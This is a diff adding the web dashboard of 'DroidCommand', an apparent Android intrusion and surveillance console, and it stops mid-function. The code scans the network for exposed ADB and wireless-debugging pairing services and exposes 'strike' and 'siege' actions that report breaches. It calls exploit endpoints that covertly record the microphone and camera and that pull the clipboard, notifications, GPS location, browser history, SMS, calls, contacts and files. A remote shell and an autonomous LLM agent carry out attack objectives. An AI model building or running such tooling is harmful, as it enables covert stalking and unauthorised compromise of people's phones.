@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>DroidCommand</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  :root {
+    --bg-space:#0B0C0E; --bg-panel:#101214; --bg-panel-hi:#16191C;
+    --bg-well:#0C0E10; --border:#1F2329; --border-sub:#1A1E23;
+    --txt:#E8EBEF; --dim:#98A1AB; --faint:#5D656E;
+    --acc:#FF5C29; --acc-cyan:#4FC3E8; --acc-cyan-hi:#5ED4F3;
+    --acc-amber:#FFC24B; --acc-ruby:#FF5D5D;
+    --acc-emerald:#3DDC97; --acc-purple:#C084FC;
+    --font-mono:"Cascadia Mono","JetBrains Mono",Consolas,"SF Mono",monospace;
+    --font-disp:"Segoe UI Variable Display","Segoe UI",Inter,system-ui,sans-serif;
+    --font-body:"Segoe UI Variable Text","Segoe UI",Inter,system-ui,sans-serif;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg-space);color:var(--txt);font-family:var(--font-body);
+    font-size:13px;line-height:1.5;padding:14px 20px 40px;min-height:100vh;
+    -webkit-font-smoothing:antialiased}
+  ::selection{background:rgba(255,92,41,.25)}
+  *{scrollbar-width:thin;scrollbar-color:#262C33 transparent}
+  *::-webkit-scrollbar{width:8px;height:8px}
+  *::-webkit-scrollbar-thumb{background:#262C33;border-radius:4px}
+  :focus-visible{outline:1px solid var(--acc);outline-offset:2px}
+
+  .master{display:flex;align-items:center;gap:18px;background:var(--bg-panel);
+    border:1px solid var(--border);border-radius:6px;padding:12px 18px;
+    margin-bottom:14px;flex-wrap:wrap}
+  .master .mark{width:34px;height:34px;flex:none;border:1px solid var(--acc);
+    border-radius:5px;display:grid;place-items:center;font-family:var(--font-mono);
+    font-size:12px;font-weight:700;color:var(--acc);letter-spacing:.04em}
+  .master-state{min-width:210px}
+  .master-state .word{font-family:var(--font-disp);font-size:26px;font-weight:750;
+    letter-spacing:.02em;line-height:1.1;color:var(--faint)}
+  .master-state .word.hunting{color:var(--acc-ruby)}
+  .master-state .word.siege{color:var(--acc-amber)}
+  .master-state .word.engaged{color:var(--acc-emerald)}
+  .master-state .sub{font-family:var(--font-mono);font-size:10.5px;color:var(--faint);
+    letter-spacing:.06em;text-transform:uppercase}
+  .master-telemetry{display:flex;gap:22px;flex-wrap:wrap;font-family:var(--font-mono);
+    font-size:11px;color:var(--dim);margin-left:auto}
+  .master-telemetry b{color:var(--txt);font-weight:600}
+  .master-actions{display:flex;gap:10px}
+  button.big{font-size:13px;font-weight:700;padding:10px 22px;letter-spacing:.04em;
+    text-transform:uppercase}
+  #armBtn.go{border-color:#4A2428;color:#fff;
+    background:linear-gradient(180deg,#8E2F2F,#6E2222)}
+  #armBtn.go:hover{background:linear-gradient(180deg,#A53A3A,#7E2828)}
+
+  .grid{display:grid;gap:14px;grid-template-columns:minmax(0,7fr) minmax(0,5fr);
+    align-items:start}
+  .panel{background:var(--bg-panel);border:1px solid var(--border);border-radius:6px;
+    padding:14px 16px;display:flex;flex-direction:column;position:relative;min-width:0;
+    transition:border-color .12s}
+  .panel:hover{border-color:#2B323A}
+  .panel.span-all{grid-column:1/-1}
+  .panel h2{font-family:var(--font-body);font-size:10px;font-weight:650;
+    letter-spacing:.12em;text-transform:uppercase;color:var(--dim);margin-bottom:12px;
+    padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;
+    justify-content:space-between;align-items:center;gap:10px}
+  .row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:6px 0}
+  button{background:var(--bg-panel-hi);border:1px solid #2B323A;color:var(--txt);
+    font-family:var(--font-body);font-size:12px;font-weight:550;padding:6px 12px;
+    border-radius:4px;cursor:pointer;transition:border-color .12s,background .12s,color .12s;
+    display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
+  button:hover{border-color:var(--faint);background:#1B1F23}
+  button.gold{border-color:#4A2B1D;color:var(--acc);background:transparent}
+  button.gold:hover{background:var(--acc);border-color:var(--acc);color:#16110D}
+  button.danger{border-color:#4A2428;color:var(--acc-ruby);background:transparent}
+  button.danger:hover{background:#2A161B;border-color:var(--acc-ruby);color:#fff}
+  input,select{background:var(--bg-well);border:1px solid var(--border);color:var(--txt);
+    font-family:var(--font-mono);font-size:12px;padding:6px 10px;border-radius:4px;
+    min-width:0;transition:border-color .12s}
+  input:focus,select:focus{outline:none;border-color:var(--acc)}
+  input::placeholder{color:var(--faint)}
+  table{width:100%;border-collapse:collapse;font-family:var(--font-mono);font-size:11px;
+    margin:8px 0}
+  th,td{text-align:left;padding:4px 8px;border-bottom:1px solid var(--border-sub);
+    color:var(--dim);max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  th{color:var(--faint);font-weight:600;letter-spacing:.1em;text-transform:uppercase;
+    font-size:9px}
+  tr:hover td{background:var(--bg-panel-hi)}
+  .kv{display:flex;justify-content:space-between;gap:12px;font-family:var(--font-mono);
+    font-size:11.5px;padding:5px 8px;background:var(--bg-well);border-radius:4px;
+    border:1px solid var(--border-sub);margin-bottom:4px}
+  .kv b{color:var(--acc-cyan-hi);font-weight:500;text-align:right}
+  .muted{color:var(--dim);font-size:11.5px}
+  .quiet{font-family:var(--font-mono);font-size:11px;color:var(--faint);
+    padding:18px 8px;text-align:center}
+  #flow{height:240px;overflow-y:auto;background:var(--bg-well);border:1px solid var(--border);
+    border-radius:4px;padding:10px 12px;font-family:var(--font-mono);font-size:11.5px;
+    line-height:1.6}
+  #flow .f-line{display:flex;gap:8px}
+  #flow .f-t{color:var(--faint);flex:none}
+  #flow .f-lv{flex:none;width:46px;letter-spacing:.05em;font-weight:600}
+  #flow .f-SYS{color:var(--acc-cyan)} #flow .f-INFO{color:var(--dim)}
+  #flow .f-ALERT{color:var(--acc-amber)} #flow .f-STRIKE{color:var(--acc-ruby)}
+  #flow .f-WARN{color:var(--acc-amber)} #flow .f-ERROR{color:var(--acc-ruby)}
+  #flow .f-HIT{color:var(--acc-emerald);font-weight:700}
+  #flow .f-BRAIN{color:var(--acc-purple);font-weight:600}
+  #glassWrap{position:relative;display:inline-block;max-width:100%;margin:8px auto;
+    background:#08090B;border:1px solid var(--border);border-radius:4px;overflow:hidden}
+  #glass{max-width:100%;max-height:52vh;display:block;cursor:crosshair;min-width:240px;
+    min-height:135px;object-fit:contain}
+  .idstrip{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px}
+  .idstrip .chip{font-family:var(--font-mono);font-size:10.5px;color:var(--dim);
+    background:var(--bg-well);border:1px solid var(--border-sub);border-radius:3px;
+    padding:3px 8px}
+  .idstrip .chip b{color:var(--txt);font-weight:600}
+  .sense{margin-bottom:6px}
+  .sense .s-head{font-family:var(--font-mono);font-size:10px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--faint);margin:8px 0 4px}
+  details summary{cursor:pointer;font-family:var(--font-mono);font-size:11px;padding:4px 0;
+    user-select:none;color:var(--dim);letter-spacing:.08em;text-transform:uppercase}
+  details summary:hover{color:var(--txt)}
+  .targets > div{padding:5px 8px;margin-bottom:4px;background:var(--bg-well);
+    border:1px solid var(--border-sub);border-radius:4px;display:flex;align-items:center;
+    gap:8px;font-family:var(--font-mono);font-size:11.5px}
+  #qrCard{background:#FFFFFF;border-radius:6px;padding:12px;width:196px;margin:8px auto;
+    border:1px solid var(--border)}
+  #qrImg{display:block;width:172px;height:172px}
+  @media(max-width:960px){.grid{grid-template-columns:1fr}body{padding:12px 12px 36px}
+    .master-telemetry{margin-left:0}}
+</style>
+</head>
+<body>
+
+<div class="master">
+  <div class="mark">DC</div>
+  <div class="master-state">
+    <div class="word" id="mWord">LISTENING</div>
+    <div class="sub" id="mSub">the machine is already working</div>
+  </div>
+  <div class="master-telemetry">
+    <span>target <b id="tTgt">none</b></span>
+    <span class="hot">dialogs <b id="tDlg">0</b></span>
+    <span>targets <b id="tNet">0</b></span>
+    <span>glass <b id="tGlass">off</b></span>
+  </div>
+  <div class="master-actions">
+    <button class="danger big" id="armBtn" onclick="masterToggle()">MASTER ARM</button>
+    <button class="danger big" onclick="abortAll()">ABORT</button>
+  </div>
+</div>
+
+<div class="grid">
+
+  <!-- ══════════ DOSSIER — left column ══════════ -->
+  <div class="panel">
+    <h2>Target Dossier <span class="muted" id="dosState">assembling automatically</span></h2>
+    <div class="idstrip" id="idStrip"><span class="chip">no device attached — pair one, the machine waits</span></div>
+    <div style="text-align:center">
+      <div id="glassWrap">
+        <img id="glass" alt="device glass">
+      </div>
+    </div>
+    <div class="row" style="justify-content:center">
+      <button onclick="capMic()">🎙 Mic 10s</button>
+      <button onclick="capCam()">📷 Camera</button>
+      <a href="/warroom" style="margin-left:8px;font-family:var(--font-mono);font-size:11px;color:var(--acc-cyan)">war room &rarr;</a>
+    </div>
+    <details style="margin-top:8px">
+      <summary>Senses (auto-refreshed)</summary>
+      <div class="sense"><div class="s-head">clipboard</div><div id="sClip" class="muted">—</div></div>
+      <div class="sense"><div class="s-head">notifications</div><div id="sNotif" class="muted">—</div></div>
+      <div class="sense"><div class="s-head">location</div><div id="sGps" class="muted">—</div></div>
+      <div class="sense"><div class="s-head">browser history</div><div id="sHist" class="muted">—</div></div>
+    </details>
+    <details style="margin-top:8px">
+      <summary>Communications</summary>
+      <div class="row">
+        <button onclick="loadComms('sms')">SMS</button>
+        <button onclick="loadComms('calls')">Calls</button>
+        <button onclick="loadComms('contacts')">Contacts</button>
+      </div>
+      <div id="commsOut" class="muted">pick a channel</div>
+    </details>
+    <details style="margin-top:8px">
+      <summary>Files</summary>
+      <div class="row">
+        <input id="fsPath" value="/sdcard" style="flex:1" placeholder="device path">
+        <button onclick="loadFiles()">List</button>
+      </div>
+      <div id="filesOut" class="muted">—</div>
+    </details>
+    <details style="margin-top:8px">
+      <summary>Apps</summary>
+      <div class="row"><button onclick="loadApps()">Installed packages</button></div>
+      <div id="appsOut" class="muted">—</div>
+    </details>
+    <details style="margin-top:8px">
+      <summary>Terminal</summary>
+      <div class="row">
+        <input id="termIn" placeholder="shell command on device" style="flex:1">
+        <button onclick="termRun()">Exec</button>
+      </div>
+      <div id="termOut" style="max-height:120px;overflow-y:auto;background:var(--bg-well);
+        border:1px solid var(--border-sub);border-radius:4px;padding:6px 8px;
+        font-family:var(--font-mono);font-size:11px;white-space:pre-wrap"></div>
+    </details>
+  </div>
+
+  <!-- ══════════ BRAIN — right column, first ══════════ -->
+  <div class="panel">
+    <h2>Brain <span class="muted" id="brainState">cortex asleep — paste a key</span></h2>
+    <div class="row">
+      <input id="brainCmd" placeholder="tell the brain what you want…" style="flex:1">
+      <button class="gold" onclick="brainGo()">GO</button>
+      <button class="danger" onclick="brainStop()">STOP</button>
+    </div>
+    <div id="brainOut" style="max-height:150px;overflow-y:auto;background:var(--bg-well);
+      border:1px solid var(--border-sub);border-radius:4px;padding:6px 8px;
+      font-family:var(--font-mono);font-size:11px;white-space:pre-wrap;color:var(--dim)">
+      the cortex thinks here — every tool it fires narrates in the flow
+    </div>
+    <div style="margin-top:6px;font-size:10px;letter-spacing:.12em;color:var(--dim)">
+      CHAT — TALK TO HER
+    </div>
+    <div id="vesperLog" style="max-height:160px;overflow-y:auto;background:var(--bg-well);
+      border:1px solid var(--border-sub);border-radius:4px;padding:6px 8px;
+      font-family:var(--font-mono);font-size:11px;white-space:pre-wrap;color:var(--ink)">
+      she answers here — recon, war, or just talk
+    </div>
+    <div class="row">
+      <input id="chatIn" placeholder="talk to her…" style="flex:1"
+        onkeydown="if(event.key==='Enter')chatSend()">
+      <button class="gold" onclick="chatSend()">Send</button>
+    </div>
+    <details style="margin-top:8px">
+      <summary>Brain config (provider · model · key)</summary>
+      <div class="row">
+        <select id="bProv" onchange="brainProv()">
+          <option value="deepseek">DeepSeek</option>
+          <option value="openai">OpenAI</option>
+          <option value="openrouter">OpenRouter</option>
+          <option value="groq">Groq</option>
+          <option value="together">Together</option>
+          <option value="ollama">Ollama (local)</option>
+          <option value="custom">Custom</option>
+        </select>
+        <input id="bModel" placeholder="model" style="flex:1">
+      </div>
+      <div class="row"><input id="bUrl" placeholder="base_url" style="flex:1"></div>
+      <div class="row">
+        <input id="bKey" type="password" placeholder="api key" style="flex:1">
+        <input id="bSteps" type="number" value="25" min="3" max="100" style="width:74px" title="max steps">
+        <button onclick="brainSave()">Save</button>
+      </div>
+    </details>
+  </div>
+
+  <!-- ══════════ HUNT — right column ══════════ -->
+  <div class="panel">
+    <h2>Hunt &amp; Pair <span class="muted" id="huntState">watching the air</span></h2>
+    <div class="row">
+      <button class="gold" id="qrBtn" onclick="qrArm()">Pair by QR</button>
+      <span class="muted">phone &rarr; Wireless debugging &rarr; <b>Pair with QR</b></span>
+    </div>
+    <div id="qrCard" style="display:none">
+      <img id="qrImg" alt="pairing QR">
+      <div id="qrMeta" class="muted" style="text-align:center;margin-top:4px"></div>
+    </div>
+    <div class="s-head" style="font-family:var(--font-mono);font-size:10px;
+      letter-spacing:.1em;text-transform:uppercase;color:var(--faint);margin-top:10px">
+      network targets (auto-swept while armed)</div>
+    <div class="targets" id="netTargets"><div class="quiet">no sweep yet — arm the master</div></div>
+  </div>
+
+  <!-- ══════════ FLOW — bottom ══════════ -->
+  <div class="panel span-all">
+    <h2>Operation Flow <span class="muted">the machine's decisions, live</span></h2>
+    <div id="flow"><div class="quiet">booting…</div></div>
+  </div>
+
+</div>
+
+<script>
+window.__DC_TOKEN = {{ api_token | tojson }};
+function H(){return {'Content-Type':'application/json','X-API-Token':window.__DC_TOKEN}}
+async function J(url,opt){const r=await fetch(url,{headers:H(),...opt});
+  const t=await r.text(); let d; try{d=JSON.parse(t)}catch(e){d={raw:t.slice(0,300)}}
+  return d;}
+function flowLine(level,msg){
+  const c=document.getElementById('flow');
+  const q=c.querySelector('.quiet'); if(q)q.remove();
+  const d=document.createElement('div'); d.className='f-line';
+  d.innerHTML=`<span class="f-t">${new Date().toLocaleTimeString()}</span>`+
+    `<span class="f-lv f-${level}">${level}</span><span>${msg}</span>`;
+  c.appendChild(d); c.scrollTop=c.scrollHeight;
+  while(c.children.length>220)c.removeChild(c.firstChild);
+}
+function logLine(s){flowLine('INFO',s);}
+function setMaster(state,sub){
+  const w=document.getElementById('mWord'); w.textContent=state;
+  w.className='word '+(state==='HUNTING'?'hunting':state==='SIEGE'?'siege'
+    :state==='ENGAGED'?'engaged':'');
+  document.getElementById('mSub').textContent=sub||'';
+}
+
+/* ══════ DEVICES: the machine knows its target, always ══════ */
+let activeSerial=null, hasDevice=false;
+async function pollDevices(){
+  const d=await fetch('/api/devices',{headers:H()}).then(r=>r.json()).catch(()=>null);
+  if(!d)return;
+  const list=(Array.isArray(d)?d:d.devices||[]).filter(x=>x);
+  const ok=list.find(x=>(x.status||x.state||'device')==='device')||list[0];
+  const serial=ok?(ok.serial||ok.id||''):null;
+  const changed=serial!==activeSerial;
+  hasDevice=!!serial;
+  activeSerial=serial;
+  document.getElementById('tTgt').textContent=serial||'none';
+  if(changed){
+    if(serial)flowLine('SYS','target online: '+serial+' — dossier assembling, glass live');
+    else flowLine('INFO','no device attached — hunt & pair to enroll one');
+    refreshIdentity();
+  }
+  if(!hasDevice){
+    document.getElementById('dosState').textContent='waiting for a target';
+    document.getElementById('glass').removeAttribute('src');
+    document.getElementById('tGlass').textContent='off';
+  }
+}
+async function refreshIdentity(){
+  if(!hasDevice){document.getElementById('idStrip').innerHTML=
+    '<span class="chip">no device attached — pair one, the machine waits</span>';return;}
+  document.getElementById('dosState').textContent='reading device…';
+  const d=await J('/api/device/info');
+  const i=d.info||{}, b=d.battery||{}, st=d.storage||{}, mem=d.memory||{};
+  const chip=(k,v)=>v?`<span class="chip">${k} <b>${v}</b></span>`:'';
+  const model=i['ro.product.model']||i.model||'', brand=i['ro.product.brand']||i.brand||'';
+  const av=i['ro.build.version.release']||i.android_version||'';
+  const bat=b.level||b.battery_level||'';
+  document.getElementById('idStrip').innerHTML=
+    chip('model',(brand+' '+model).trim())+chip('android',av)+chip('battery',bat?bat+'%':'')+
+    chip('serial',activeSerial)+
+    chip('storage',st.total?(st.available||st.free||'')+' free':'')+
+    chip('ram',mem.total||'');
+  document.getElementById('dosState').textContent='dossier live — glass streaming, senses polling';
+  flowLine('SYS',`identity: ${brand} ${model} android ${av} bat ${bat}%`);
+}
+
+/* ══════ GLASS: streams itself, taps itself ══════ */
+setInterval(()=>{
+  if(!hasDevice)return;
+  const img=document.getElementById('glass');
+  img.src='/api/screen/frame'+(activeSerial?`?serial=${encodeURIComponent(activeSerial)}`:'')
+    +'&t='+Date.now();
+  document.getElementById('tGlass').textContent='live';
+},1200);
+(function(){
+  const img=document.getElementById('glass'); let drag=null;
+  img.addEventListener('dragstart',e=>e.preventDefault());
+  img.addEventListener('pointerdown',e=>{const r=img.getBoundingClientRect();
+    drag=[e.clientX-r.left,e.clientY-r.top];});
+  img.addEventListener('pointerup',async e=>{
+    if(!drag||!hasDevice)return;
+    const r=img.getBoundingClientRect();
+    const end=[e.clientX-r.left,e.clientY-r.top];
+    const dist=Math.hypot(end[0]-drag[0],end[1]-drag[1]);
+    const view={w:r.width,h:r.height};
+    const s=activeSerial?`serial=${encodeURIComponent(activeSerial)}&`:'';
+    if(dist<12)
+      await J(`/api/screen/tap?${s}`,{method:'POST',
+        body:JSON.stringify({x:Math.round(drag[0]),y:Math.round(drag[1])})});
+    else
+      await J(`/api/screen/swipe?${s}`,{method:'POST',
+        body:JSON.stringify({points:[drag,end],view,ms:400})});
+    drag=null;
+  });
+})();
+async function capMic(){
+  if(!hasDevice)return flowLine('WARN','no device for mic');
+  flowLine('SYS','mic recording 10s…');
+  const r=await fetch('/api/exploit/mic-record',{method:'POST',headers:H(),
+    body:JSON.stringify({duration:10})});
+  if(r.ok){const b=await r.blob();dl(b,'mic_'+Date.now()+'.mp4');
+    flowLine('HIT','mic clip captured');}
+  else flowLine('ERROR','mic failed: '+r.status);
+}
+async function capCam(){
+  if(!hasDevice)return flowLine('WARN','no device for camera');
+  flowLine('SYS','camera capture…');
+  const r=await fetch('/api/exploit/camera-capture',{method:'POST',headers:H(),
+    body:JSON.stringify({camera_id:0})});
+  if(r.ok){const b=await r.blob();dl(b,'cam_'+Date.now()+'.jpg');
+    flowLine('HIT','photo captured');}
+  else flowLine('ERROR','camera failed: '+r.status);
+}
+function dl(blob,name){const u=URL.createObjectURL(blob);const a=document.createElement('a');
+  a.href=u;a.download=name;a.click();URL.revokeObjectURL(u);}
+
+/* ══════ SENSES: poll themselves when the drawer is open ══════ */
+function unwrap(d){return (d&&(d.data??d.messages??d.notifications??d.items
+  ??d.results??d.history))??d;}
+function renderList(el,data,max=8){
+  const arr=Array.isArray(data)?data:null;
+  if(arr&&arr.length){
+    const cols=Object.keys(arr[0]).slice(0,5);
+    el.innerHTML='<table><thead><tr>'+cols.map(c=>'<th>'+c+'</th>').join('')+
+      '</tr></thead><tbody>'+arr.slice(0,max).map(x=>'<tr>'+cols.map(c=>
+        '<td>'+String(x[c]??'').slice(0,60)+'</td>').join('')+
+        '</tr>').join('')+'</tbody></table>';
+  } else el.textContent=typeof data==='string'?data.slice(0,300):JSON.stringify(data).slice(0,300);
+}
+async function pollSenses(){
+  if(!hasDevice)return;
+  const d=document.querySelector('#sClip').closest('details');
+  if(!d||!d.open)return;
+  const c=await J('/api/exploit/clipboard').catch(()=>null);
+  if(c)document.getElementById('sClip').textContent=
+    String(c.clipboard??c.content??c.output??JSON.stringify(c)).slice(0,200);
+  const n=await J('/api/exploit/notifications').catch(()=>null);
+  if(n)renderList(document.getElementById('sNotif'),unwrap(n),5);
+  const g=await J('/api/exploit/gps-location').catch(()=>null);
+  if(g){const lat=g.latitude??g.lat,lon=g.longitude??g.lon;
+    document.getElementById('sGps').innerHTML=(lat!=null)?
+      `<b>${lat}, ${lon}</b>${g.accuracy?(' ±'+g.accuracy):''}`:
+      String(JSON.stringify(g)).slice(0,160);}
+  const h=await J('/api/exploit/browser-history').catch(()=>null);
+  if(h)renderList(document.getElementById('sHist'),unwrap(h),5);
+}
+setInterval(pollSenses,15000);
+
+/* ══════ COMMS / FILES / APPS / TERMINAL: one tap each ══════ */
+async function loadComms(which){
+  const el=document.getElementById('commsOut');
+  el.textContent='reading '+which+'…';
+  const d=await J('/api/comms/'+which);
+  renderList(el,unwrap(d),10);
+}
+async function loadFiles(){
+  const el=document.getElementById('filesOut');
+  const p=document.getElementById('fsPath').value.trim()||'/sdcard';
+  el.textContent='listing '+p+'…';
+  const d=await J('/api/files/list?path='+encodeURIComponent(p));
+  const items=Array.isArray(unwrap(d))?unwrap(d):(d.entries||d.files||[]);
+  if(!Array.isArray(items)||!items.length){el.textContent=JSON.stringify(d).slice(0,200);return;}
+  el.innerHTML='<table><tbody>'+items.slice(0,40).map(x=>{
+    const nm=String(x.name||x.filename||x.path||x);
+    const sub=(x.is_dir||x.isdir||x.type==='dir');
+    const safeP=p.replace(/'/g,'');
+    return `<tr><td>${sub?'📁':'📄'}</td><td>${nm}</td><td>${x.size??''}</td>`+
+      (sub?`<td><button style="padding:0 6px;font-size:10px" onclick="document.getElementById('fsPath').value='${safeP}/${nm}';loadFiles()">open</button></td>`:'')+
+      '</tr>';}).join('')+'</tbody></table>';
+}
+async function loadApps(){
+  const el=document.getElementById('appsOut');
+  el.textContent='listing packages…';
+  const d=await J('/api/apps/list');
+  const items=Array.isArray(unwrap(d))?unwrap(d):(d.apps||d.packages||[]);
+  el.innerHTML=items.length?
+    `<div class="muted">${items.length} packages</div>`+
+    items.slice(0,30).map(x=>typeof x==='string'?x:
+      `${x.package||x.name||''} ${(x.version?'· '+x.version:'')}`).join('<br>')
+    :JSON.stringify(d).slice(0,200);
+}
+async function termRun(){
+  const inp=document.getElementById('termIn');
+  const cmd=inp.value.trim(); if(!cmd)return;
+  const out=document.getElementById('termOut');
+  out.textContent+='$ '+cmd+'\n';
+  const d=await J('/api/terminal/exec',{method:'POST',
+    body:JSON.stringify({command:cmd})});
+  out.textContent+=(d.output||JSON.stringify(d))+'\n';
+  out.scrollTop=out.scrollHeight; inp.value='';
+}
+
+/* ══════ HUNT: mirror of the war ══════ */
+let masterArmed=false, hunLastTs='';
+function masterUi(){const b=document.getElementById('armBtn');
+  if(masterArmed){b.textContent='STAND DOWN';b.classList.add('go');b.classList.remove('danger');}
+  else{b.textContent='MASTER ARM';b.classList.remove('go');b.classList.add('danger');}}
+async function masterToggle(){
+  if(!masterArmed){
+    const d=await J('/api/ghost/hunter/arm',{method:'POST'});
+    if(!d.success){flowLine('ERROR','arm refused: '+(d.error||'?'));return;}
+    masterArmed=true;masterUi();
+    flowLine('SYS','MASTER ARM — hunter live, network auto-sweeps every 45s');
+    autoSweep();
+  }else{masterArmed=false;masterUi();
+    await J('/api/ghost/hunter/standdown',{method:'POST'});
+    flowLine('SYS','stood down');}
+}
+async function abortAll(){
+  masterArmed=false;masterUi();clearInterval(qrTimer);
+  await J('/api/ghost/hunter/standdown',{method:'POST'});
+  await J('/api/ghost/pairing-siege/stop',{method:'POST'});
+  await J('/api/siege/stop',{method:'POST'});
+  await J('/api/ghost/qr/stop',{method:'POST'});
+  flowLine('STRIKE','ABORT ALL — hunter down, both sieges stopped, QR closed');
+}
+let sweeping=false;
+async function autoSweep(){
+  if(!masterArmed||sweeping)return; sweeping=true;
+  const d=await J('/api/ghost/hunter/sweep',{method:'POST',
+    body:JSON.stringify({mdns_window:5})});
+  sweeping=false;
+  if(d.success){
+    document.getElementById('tNet').textContent=d.targets.length;
+    document.getElementById('tDlg').textContent=d.pairing_services.length;
+    const box=document.getElementById('netTargets');
+    box.innerHTML=d.targets.length?d.targets.map(t=>{
+      const cls={OPEN_ADB:'var(--acc-emerald)',PAIRING_DIALOG:'var(--acc-amber)',
+        STLS:'var(--acc-purple)',GATED:'var(--txt)',DORMANT:'var(--faint)'}[t.class]||'var(--dim)';
+      const ip=(t.ip||'').replace(/'/g,'');
+      return `<div><span style="color:${cls}">[${t.class}]</span> `+
+        `<b>${ip}:${t.port}</b><span style="flex:1"></span>`+
+        `<button style="padding:0 6px;font-size:10px" onclick="strike('${ip}',${t.port})">strike</button></div>`;
+    }).join(''):'<div class="quiet">air clean — nothing answering</div>';
+    if(d.pairing_services.length)
+      flowLine('ALERT','live pairing dialog: '+d.pairing_services.map(p=>p.ip+':'+p.port).join(', '));
+  }
+}
+async function strike(ip,port){
+  flowLine('STRIKE',`striking ${ip}:${port}…`);
+  const d=await J('/api/ghost/hunter/engage',{method:'POST',
+    body:JSON.stringify({ip,port})});
+  flowLine(d.success?'HIT':'INFO',
+    `${ip}:${d.port||port} → ${d.vector||'?'} ${d.success?'✓ BREACH':'— no breach'}`);
+}
+async function huntStatus(){
+  const d=await J('/api/ghost/hunter/status');
+  if(d.armed!==masterArmed){masterArmed=d.armed;masterUi();
+    flowLine('SYS',d.armed?'hunter live (synced)':'hunter stood down (synced)');}
+  if(d.siege&&d.siege.running)setMaster('SIEGE',`working ${d.siege.ip}:${d.siege.port}`);
+  else if(masterArmed)setMaster('HUNTING','watcher live — strikes on new dialogs');
+  else if(hasDevice)setMaster('ENGAGED','device attached — glass streaming');
+  else setMaster('LISTENING','the machine is already working');
+  (d.log||[]).forEach(e=>{if(e.ts>hunLastTs){hunLastTs=e.ts;flowLine(e.level,e.msg);}});
+  if(d.targets&&d.targets.length)document.getElementById('tNet').textContent=d.targets.length;
+}
+
+/* ══════ QR pair ══════ */
+let qrTimer=null;
+async function qrArm(){
+  const d=await J('/api/ghost/qr/start',{method:'POST',body:JSON.stringify({ttl_s:300})});
+  if(!d.success){flowLine('ERROR','qr: '+(d.error||'start failed'));return;}
+  document.getElementById('qrImg').src=d.qr_svg;
+  document.getElementById('qrCard').style.display='block';
+  document.getElementById('qrMeta').innerHTML=
+    `${d.lan_ip}:${d.port} — scan now`;
+  clearInterval(qrTimer);qrTimer=setInterval(qrPoll,1500);
+  flowLine('SYS','QR gate armed');
+}
+async function qrPoll(){
+  const s=await fetch('/api/ghost/qr/status',{headers:H()}).then(r=>r.json()).catch(()=>null);
+  if(!s)return;
+  if(s.paired){clearInterval(qrTimer);
+    document.getElementById('qrMeta').innerHTML='<b style="color:var(--acc-emerald)">PAIRED ✓</b> phone trusts our key';
+    document.getElementById('qrCard').style.display='none';
+    flowLine('HIT','*** QR PAIRING COMPLETE ***');}
+  else if(!s.running){clearInterval(qrTimer);
+    document.getElementById('qrCard').style.display='none';
+    flowLine('INFO','qr session closed/expired');}
+}
+
+/* ══════ BRAIN: the cortex ══════ */
+function brainProv(){
+  const p=document.getElementById('bProv').value;
+  const presets={deepseek:['https://api.deepseek.com/v1','deepseek-chat'],
+    openai:['https://api.openai.com/v1','gpt-4o-mini'],
+    openrouter:['https://openrouter.ai/api/v1','openrouter/auto'],
+    groq:['https://api.groq.com/openai/v1','llama-3.3-70b-versatile'],
+    together:['https://api.together.xyz/v1','meta-llama/Llama-3.3-70B-Instruct-Turbo'],
+    ollama:['http://127.0.0.1:11434/v1','llama3.1'],
+    custom:['','']};
+  document.getElementById('bUrl').value=presets[p][0];
+  document.getElementById('bModel').value=presets[p][1];
+}
+let lastBrainFinal=null;
+async function brainLoad(){
+  const c=await J('/api/brain/config');
+  if(c.success){
+    document.getElementById('bProv').value=c.provider||'deepseek';
+    document.getElementById('bUrl').value=c.base_url||'';
+    document.getElementById('bModel').value=c.model||'';
+    document.getElementById('bSteps').value=c.max_steps||25;
+  }
+}
+async function brainSave(){
+  const d=await J('/api/brain/config',{method:'POST',body:JSON.stringify({
+    provider:document.getElementById('bProv').value,
+    base_url:document.getElementById('bUrl').value,
+    model:document.getElementById('bModel').value,
+    api_key:document.getElementById('bKey').value,
+    max_steps:parseInt(document.getElementById('bSteps').value)||25})});
+  flowLine(d.success?'SYS':'ERROR',
+    d.success?`brain wired: ${d.provider} · ${d.model}${d.has_key?' — key loaded':''}`
+             :('brain config: '+(d.error||'?')));
+  document.getElementById('bKey').value='';
+}
+async function brainGo(){
+  const o=document.getElementById('brainCmd').value.trim();if(!o)return;
+  const d=await J('/api/brain/task',{method:'POST',body:JSON.stringify({objective:o})});
+  if(d.success){flowLine('BRAIN','task armed: '+o);
+    document.getElementById('brainCmd').value='';brainPoll();}
+  else flowLine('ERROR','brain: '+(d.error||d.message||'?'));
+}
+async function brainStop(){await J('/api/brain/stop',{method:'POST'});
+  flowLine('STRIKE','brain stop signal sent');}
+async function brainPoll(){
+  const s=await J('/api/brain/status');
+  const st=document.getElementById('brainState');
+  st.textContent=s.state==='running'
+    ?`thinking · step ${s.step}/${s.max_steps} · ${s.provider} ${s.model}`
+    :(s.has_key?`armed · ${s.provider} · ${s.model} — idle`:'cortex asleep — paste a key');
+  const box=document.getElementById('brainOut');
+  const want=(s.narration||[]).join('\n')||'the cortex thinks here — every tool it fires narrates in the flow';
+  if(box.dataset.k!==want){box.textContent=want;box.scrollTop=box.scrollHeight;box.dataset.k=want;}
+  if(s.final&&s.final!==lastBrainFinal){lastBrainFinal=s.final;
+    flowLine('HIT','BRAIN final: '+s.final.slice(0,200));}
+  if(s.error)flowLine('ERROR','brain: '+String(s.error).slice(0,160));
+  if(s.state==='running')setTimeout(brainPoll,1200);
+  else setTimeout(brainPoll,6000);
+}
+let lastChatCount=-1;
+async function chatSend(){
+  const m=document.getElementById('chatIn').value.trim();if(!m)return;
+  const d=await J('/api/brain/chat',{method:'POST',body:JSON.stringify({message:m})});
+  if(d.success){document.getElementById('chatIn').value='';
+    flowLine('BRAIN','vesper heard you');chatPoll();brainPoll();}
+  else flowLine('ERROR','vesper: '+(d.error||d.message||'?'));
+}
+async function chatPoll(){
+  const l=await J('/api/brain/chat');
+  if(!l.success)return;
